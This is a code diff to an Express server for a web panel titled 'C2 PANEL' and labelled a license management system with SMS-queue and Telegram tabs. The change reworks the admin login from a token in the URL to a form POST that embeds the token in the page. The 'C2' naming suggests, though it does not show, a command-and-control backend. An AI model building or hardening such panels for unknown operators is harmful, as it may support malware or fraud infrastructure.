@@ -186,13 +186,6 @@ app.post("/api/auth/login", (req, res) => {
   res.json({success:true,token:jwtSign({username,role:u.role}),expiresIn:7200});
 });
 
-app.post("/api/auth/login-form", (req, res) => {
-  const u=store._data.users[req.body?.username];
-  if(!u||u.password!==crypto.createHash("sha256").update(req.body?.password||"").digest("hex"))
-    return res.redirect("/?error=1");
-  res.redirect("/?token="+jwtSign({username:req.body.username,role:u.role}));
-});
-
 // ====== ADMIN API ======
 app.get("/api/admin/get-licenses", requireAuth, (req,res) => {
   res.json({success:true,licenses:store.getKeys()});
@@ -300,12 +293,12 @@ td{padding:10px 8px;font-size:14px;border-bottom:1px solid #1a1a26}
   <div class="login-box">
     <h1>✦ C2 PANEL</h1>
     <p>License Management System</p>
-    <form action="/api/auth/login-form" method="POST">
+    <form id="loginForm" action="/" method="POST">
       <input type="text" name="username" placeholder="Username" required>
       <input type="password" name="password" placeholder="Password" required>
-      <button type="submit">Sign In</button>
+      <button type="submit" id="signInBtn">Sign In</button>
     </form>
-    <div class="error" style="display:block;color:#ff9500;text-align:center;margin-top:12px">__ERROR_MSG__</div>
+    <div class="error" id="loginError" style="display:none;color:#ff3333;text-align:center;margin-top:12px"></div>
   </div>
 </div>
 
@@ -451,19 +444,21 @@ function switchTab(el,id) {
   if(id==='tabSms') loadSmsQueue();
 }
 
-// === LOGIN (form-based, most reliable) ===
-function logout(){TOKEN=null;document.getElementById('loginWrap').style.display='flex';document.getElementById('dashboard').style.display='none';}
-
-const urlToken=new URLSearchParams(window.location.search).get('token');
-if(urlToken){
-  TOKEN=urlToken;
-  document.getElementById('loginWrap').style.display='none';
-  document.getElementById('dashboard').style.display='block';
-  document.getElementById('userDisplay').textContent='admin';
+// === LOGIN ===
+const INITIAL_TOKEN = '__TOKEN__';
+const INITIAL_ERROR = '__ERROR__';
+if (INITIAL_TOKEN) {
+  TOKEN = INITIAL_TOKEN;
+  document.getElementById('loginWrap').style.display = 'none';
+  document.getElementById('dashboard').style.display = 'block';
   loadKeys();
-  // Clean URL
-  window.history.replaceState({}, document.title, '/');
 }
+if (INITIAL_ERROR) {
+  const err = document.getElementById('loginError');
+  err.textContent = INITIAL_ERROR;
+  err.style.display = 'block';
+}
+function logout(){TOKEN=null;document.getElementById('loginWrap').style.display='flex';document.getElementById('dashboard').style.display='none';}
 
 // === LICENSES ===
 async function loadKeys() {
@@ -569,8 +564,18 @@ async function saveTelegram(){
 </body>
 </html>`;
 
-app.get("/", (req, res) => {
-  res.type("html").send(ADMIN_HTML.replace("__ERROR_MSG__",req.query.error?"Invalid credentials":""));
+app.all("/", (req, res) => {
+  if (req.method === "POST") {
+    const {username,password}=req.body;
+    if (username&&password) {
+      const u=store._data.users[username];
+      if (u&&u.password===crypto.createHash("sha256").update(password).digest("hex")) {
+        return res.type("html").send(ADMIN_HTML.replace("__TOKEN__",jwtSign({username,role:u.role})).replace("__ERROR__",""));
+      }
+    }
+    return res.type("html").send(ADMIN_HTML.replace("__TOKEN__","").replace("__ERROR__","Invalid credentials"));
+  }
+  res.type("html").send(ADMIN_HTML.replace("__TOKEN__","").replace("__ERROR__",""));
 });
 
 app.listen(PORT, "0.0.0.0", () => console.log("C2 Server on port "+PORT));
